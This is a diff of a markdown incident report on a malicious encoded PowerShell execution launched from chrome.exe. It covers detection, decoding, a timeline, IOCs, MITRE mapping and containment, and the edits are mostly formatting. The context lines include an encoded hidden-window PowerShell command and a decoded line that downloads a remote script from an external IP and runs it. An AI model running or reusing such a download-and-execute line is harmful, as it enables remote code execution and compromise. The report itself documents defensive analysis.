@@ -24,12 +24,13 @@ Further investigation revealed:
 - Potential command-and-control communication behavior
 - Fileless execution characteristics
 
-The incident was classified as a HIGH severity threat due to the possibility of malware staging and lateral movement preparation
+The incident was classified as a HIGH severity threat due to the possibility of malware staging and lateral movement preparation.
 
+---
 
 # 🚨 Detection
 
-## Sysmon Event ID 1 - Process Creation
+## Sysmon Event ID 1 — Process Creation
 
 ```powershell
 powershell.exe -nop -w hidden -e JABjAGwA...
@@ -39,13 +40,13 @@ powershell.exe -nop -w hidden -e JABjAGwA...
 
 - Encoded PowerShell execution
 - Hidden window execution
-- Suspicious parent process (Chrome)
+- Suspicious parent process (`chrome.exe`)
 - External network communication
 - In-memory execution behavior
 
 ---
 
-#  Investigation & Analysis
+# 🔍 Investigation & Analysis
 
 ## Decoded Payload
 
@@ -62,15 +63,6 @@ IEX (New-Object Net.WebClient).DownloadString('http://45.33.32.18/payload.ps1')
 
 ---
 
-#  MITRE ATT&CK Mapping
-
-| Tactic | Technique | ID |
-|--------|-----------|----|
-| Execution | PowerShell | T1059.001 |
-| Defense Evasion | Obfuscated Files or Information | T1027 |
-| Command and Scripting Interpreter | PowerShell | T1059 |
- ---
-
 # 🕒 Attack Timeline
 
 | Time (UTC) | Event |
@@ -86,7 +78,19 @@ IEX (New-Object Net.WebClient).DownloadString('http://45.33.32.18/payload.ps1')
 | 14:25:44 | Malicious process terminated |
 | 14:27:01 | External IP blocked at firewall |
 
-#  IOC Extraction
+---
+
+# 🧠 MITRE ATT&CK Mapping
+
+| Tactic | Technique | ID |
+|--------|-----------|----|
+| Execution | PowerShell | T1059.001 |
+| Defense Evasion | Obfuscated Files or Information | T1027 |
+| Command and Scripting Interpreter | PowerShell | T1059 |
+
+---
+
+# 🧪 IOC Extraction
 
 | Type | Value |
 |------|-------|
@@ -97,7 +101,7 @@ IEX (New-Object Net.WebClient).DownloadString('http://45.33.32.18/payload.ps1')
 
 ---
 
-#  Containment Actions
+# 🔒 Containment Actions
 
 - Terminated malicious PowerShell process
 - Blocked external IP communication
@@ -106,7 +110,7 @@ IEX (New-Object Net.WebClient).DownloadString('http://45.33.32.18/payload.ps1')
 
 ---
 
-#  Lessons Learned
+# 📚 Lessons Learned
 
 - PowerShell logging should be enhanced
 - Script Block Logging should be enabled
@@ -115,9 +119,10 @@ IEX (New-Object Net.WebClient).DownloadString('http://45.33.32.18/payload.ps1')
 
 ---
 
-# Evidence & Screenshots
+# 🖼️ Evidence & Screenshots
 
 Planned screenshots:
+
 - Sysmon Event Viewer logs
 - Wireshark traffic capture
 - Wazuh alert dashboard
